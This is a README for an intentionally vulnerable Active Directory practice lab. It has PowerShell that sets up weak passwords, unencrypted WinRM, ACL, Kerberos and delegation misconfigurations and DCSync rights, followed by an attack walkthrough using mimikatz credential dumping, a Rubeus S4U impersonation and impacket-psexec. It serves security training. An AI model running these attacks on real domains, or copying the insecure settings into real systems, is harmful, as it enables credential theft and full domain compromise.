# Gotham Active Directory Lab

Simulated **vulnerable Active Directory environment** used for practicing:

* Privilege escalation
* Kerberos attacks
* ACL abuse
* Delegation abuse
* Lateral movement
* Domain compromise

---

# Table of Contents

1. Lab Infrastructure
2. Part 1 — Lab Environment Setup
3. Part 2 — Attack Path & Exploitation
4. Tools Used

---

# 1. Lab Infrastructure

| Hostname | IP Address    | Description              |
| -------- | ------------- | ------------------------ |
| jmp      | 172.16.10.152 | Jump host                |
| arkham   | 172.16.10.172 | Hugo local admin → WinRM |
| web01    | 172.16.10.174 | Alfred weak password     |
| file01   | 172.16.10.178 | Lucius                   |

---

# PART 1 — Lab Environment Setup

This section describes how the vulnerable AD environment is created.

---

# 2. Lab Misconfiguration

The lab intentionally disables several security controls.

* Password complexity disabled
* WinRM Basic Authentication enabled
* Allow unencrypted WinRM connections
* TrustedHosts configured with wildcard
* Weak passwords configured

---

# Enable PowerShell Remoting

```powershell
Enable-PSRemoting -Force

Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*'
```

---

# Create AD Environment

## Import AD Module

```powershell
Import-Module ActiveDirectory

$domain = "gotham.local"
$baseDN = "DC=gotham,DC=local"
$ouPath = "OU=GothamLab,$baseDN"

New-ADOrganizationalUnit -Name "GothamLab" -Path $baseDN -ErrorAction SilentlyContinue
```

---

# Create Security Groups

```powershell
$groups = @(
"WayneEnterprises",
"Arkham",
"Rogues",
"JusticeLeague"
)

foreach ($group in $groups) {

New-ADGroup `
-Name $group `
-SamAccountName $group `
-GroupScope Global `
-GroupCategory Security `
-Path $ouPath `
-ErrorAction SilentlyContinue

}
```

---

# Create Users

```powershell
$users = @(
@{Name="alfred"; Group="WayneEnterprises"; Password="P@ssw0rd"},
@{Name="bruce"; Group="WayneEnterprises"; Password="Bruc3Wayne!"},
@{Name="gordon"; Group="JusticeLeague"; Password="Commiss10n3r"},
@{Name="lucius"; Group="WayneEnterprises"; Password="P@ssw0rd2024"},
@{Name="joker"; Group="Rogues"; Password="WhyS0Serious!"},
@{Name="bane"; Group="Rogues"; Password="Welcome2024!"},
@{Name="riddler"; Group="Rogues"; Password="Riddl3M3Th1s"; Description="Riddl3M3Th1s"},
@{Name="harley"; Group="Rogues"; Password="Gotham2024!"},
@{Name="penguin"; Group="Rogues"; Password="Penguin2024!"},
@{Name="hugo"; Group="Arkham"; Password="Str4ngeMind!"}
)
```

---

# Add Users to Active Directory

```powershell
foreach ($user in $users) {

$securePass = ConvertTo-SecureString $user.Password -AsPlainText -Force
$upn = "$($user.Name)@$domain"

New-ADUser `
-Name $user.Name `
-SamAccountName $user.Name `
-UserPrincipalName $upn `
-AccountPassword $securePass `
-Enabled $true `
-Path $ouPath `
-PasswordNeverExpires $true

Add-ADGroupMember -Identity $user.Group -Members $user.Name

}
```

---

# Configure Privilege Misconfigurations

## Hugo Local Administrator on Arkham

```powershell
net localgroup Administrators gotham\hugo /add
```

---

# ACL Misconfiguration

## Riddler → GenericWrite on Hugo

```powershell
$attacker = Get-ADUser -Identity "riddler"
$sid = New-Object System.Security.Principal.SecurityIdentifier($attacker.SID)

$target = Get-ADUser -Identity "hugo"
$targetPath = "LDAP://" + $target.DistinguishedName

$entry = [ADSI]$targetPath
$acl = $entry.ObjectSecurity

$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule (
$sid,
"GenericWrite",
"Allow"
)

$acl.AddAccessRule($rule)

$entry.ObjectSecurity = $acl
$entry.CommitChanges()
```

---

# Kerberos Misconfiguration

## Kerberoasting Target

```powershell
Set-ADUser -Identity "penguin" `
-ServicePrincipalNames @{Add="CIFS/client01.gotham.local"}
```

Add penguin as local admin

```powershell
net localgroup Administrators gotham\penguin /add
```

---

# AS-REP Roasting Target

```powershell
$user = Get-ADUser bane -Properties userAccountControl

$uac = $user.userAccountControl
$newUAC = $uac -bor 4194304

Set-ADUser bane -Replace @{userAccountControl=$newUAC}
```

---

# Delegation Misconfiguration

## Unconstrained Delegation

```powershell
Set-ADAccountControl -Identity "lucius" -TrustedForDelegation $true
```

---

# DCSync Privilege

```powershell
$domainDN = (Get-ADDomain).DistinguishedName

dsacls $domainDN /G "gordon:CA;Replicating Directory Changes" /I:S
dsacls $domainDN /G "gordon:CA;Replicating Directory Changes All" /I:S
```

---

# PART 2 — Attack Path & Exploitation

This section describes how the vulnerabilities are exploited.

---

# Initial Access

| User    | Technique                         |
| ------- | --------------------------------- |
| penguin | Kerberoasting                     |
| bane    | AS-REP Roasting                   |
| riddler | Password leak (Description field) |
| gordon  | KeePass database                  |
| bruce   | Ansible vault                     |
| harley  | SSH passphrase                    |

---

# Attack Chain

```
jmp (172.16.10.152)
   │
   └── arkham (172.16.10.172)
        │
        └── hugo
             │
             └── WinRM access
                  │
                  └── BloodHound enumeration
```

Additional access:

```
web01
 └─ alfred → weak password brute force

file01
 └─ lucius → delegation abuse
```

---

# Credential Dumping

```powershell
mimikatz
sekurlsa::logonpasswords
```

---

# Kerberos S4U Attack

```bash
Rubeus.exe s4u /user:FILE05$ \
/rc4:89720071f21f9af8ea14e6e5674335b5 \
/impersonateuser:Administrator \
/msdsspn:CIFS/arkham.gotham.local \
/domain:gotham.local \
/ptt
```

---

# Convert Ticket on Kali

```bash
cat p.kirbi | base64 -d > l.kirbi

impacket-ticketConverter l.kirbi p.ccache
```

---

# Lateral Movement

```bash
impacket-psexec administrator@arkham.gotham.local -k -no-pass
```

Result:

```
Administrator shell on arkham
```

---

# Tools Used

| Tool       | Purpose                    |
| ---------- | -------------------------- |
| BloodHound | AD attack path enumeration |
| Mimikatz   | Credential dumping         |
| Rubeus     | Kerberos abuse             |
| Impacket   | Lateral movement           |
| PowerShell | AD configuration           |
| dsacls     | ACL manipulation           |

---
